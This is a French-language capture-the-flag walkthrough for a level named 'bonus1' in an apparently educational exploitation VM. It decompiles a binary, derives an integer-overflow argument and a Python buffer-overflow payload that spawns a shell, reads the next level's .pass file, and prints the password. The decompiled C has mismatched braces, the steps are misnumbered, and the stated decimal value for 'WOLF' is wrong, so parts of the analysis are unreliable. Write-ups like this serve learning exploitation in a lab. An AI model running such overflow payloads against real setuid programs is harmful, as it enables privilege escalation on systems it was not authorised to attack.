# BONUS 1
## Walkthrough

Voici les étapes suivit pour accéder au niveau supérieur, soit le `bonus2`.

1. Une fois connecté à la VM sur le `bonus1`, l'on retrouve un fichier `bonus1` situé à la racine du dossier utilisateur. Ce dernier s'avère être de nouveau un exécutable ELF (Executable and Linkable Format).

2. On extrait ce fichier sur la machine host soit en utilisant la commande `scp` soit en utilisant un logiciel créer à cet effet.

	```sh
	> scp -P 4242 bonus1@127.0.0.1:bonus1 /path/on/machine/host
	```

3. On ouvre ensuite ce fichier dans Ghidra et après analyse, on obtient le désassemblage ci-dessous (que l'on refactorise pour plus de clarté).

    ```sh
    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>
    #include <unistd.h>
    #include <sys/types.h>
    #include <time.h>
    #include <stdbool.h>

    int main(int argc, char** argv)
    {
    	int uVar1;
    	char buffer[40];
    	int size = atoi(argv[1]);

    	if (size < 10) {
    		memcpy(buffer, argv[2], size * 4);
    		if (size == 0x574f4c46)
    			execl("/bin/sh","sh",0);
    		}
    		uVar1 = 0;
    	} else {
    		uVar1 = 1;
    	}
    	return uVar1;
    }
    ```

    À partir de ce désassemblage, on en déduit que notre programme ne possède qu'une seule fonction `main` qui prends les arguments traditionnelles `int argc` et `char ***argv`).

    En court, le programme semble attendre deux arguments. Le premier doit être un entier inférieur à `10`, et le second doit être une chaîne de caractères. Si le premier argument est inférieur à `10`, le code copie une partie du premier argument dans un tampon, puis vérifie si la partie copiée est égale à `WOLF` (la valeur `ASCII` de `1463249894` est `WOLF`). Si c'est le cas, le programme lance un `shell interactif` et renvoie `0`. Sinon, le programme retourne `1`.

7. L'objectif ici est donc de provoquer un `overflow` de la variable `buffer` pour exécuter le code associé en passant des arguments spécifiques. Selon le désassemblage, le premier argument doit être un entier inférieur à `10` et équivalent à la valeur hexadécimale de `WOLF`. Comme le programme utilise ensuite `argv[2]` pour copier `4 * size` octets, où `size` est la taille de `argv[1]`, dans un tampon de `40 octets`, le premier argument doit être préalablement divisé par `4` pour éviter une multiplication inattendue dans `buffer`. Puisque la taille de `buffer` est de `40 octets` et que `WOLF` contient `4 octets`, un débordement de `44 octets` via le second argument est nécessaire pour atteindre et modifier le flux d'exécution.

5. A présent, on peut commencer à générer les differents `payloads` nécessaires à l'exploitation de ce programme.

    - Premier `payload` :

        La création du premier `payload` s'effectue en déterminant la valeur maximale d'un entier non signé, `MAX_UNSIGNED_INT`, puis en calculant la différence entre cette valeur maximale et la somme des tailles de `buffer` et de la chaîne de caractères `WOLF`. Cette différence, équivalente à `MAX_UNSIGNED_INT - 44`, doit ensuite être divisée par 4. Le résultat, arrondi à l'entier inférieur et multiplié par `-1`, donne ainsi le premier argument nécessaire pour déclencher le débordement de tampon dans le programme.

        ```sh
        MAX_UNSIGNED_INT = 4294967295
		MAX_UNSIGNED_INT - (sizeof(buffer) + sizeof("WOLF")) = MAX_UNSIGNED_INT - 44
		(MAX_UNSIGNED_INT - 44) / 4 = 1073741812.75 ≈ -1073741812
        ```

        De ce fait, on obtient le premier `payload`, soit la valeur `-1073741812`.

    - Second `payload` :

        ```sh
    	python -c "print('\x90' * 40 + 'FLOW')"
        ````

        On a :
        - `'\x90' * 40`: L'overflow du buffer nécessaire ;
        - `'FLOW'`: La chaine de caractère `WOLF` en format `little-endian`.

6. Il manque plus qu'à lancer le programme avec les `payloads` précédemment définies pour `buffer overflow` et lancer le `shell interactif`. On exécute la fonction `whoami` pour s'assurer que l'on est bien l'utilisateur `bonus2` et non plus l'utilisateur `bonus1`. Enfin, on `cat` le fichier `/home/user/bonus2/.pass` pour obtenir le mot de passe.

    ```sh
    > ./bonus1 -1073741812 $(python -c "print('\x90' * 40 + 'FLOW')")
    > whoami
    bonus2
    > cat /home/user/bonus2/.pass
    579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
    ```

7. On peut à présent passer au niveau supérieur en exécutant la commande `su bonus2` et en y spécifiant le mot de passe qui vient d'être trouvée.

    ```sh
    > su bonus2
    Password :
    > 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
    ```
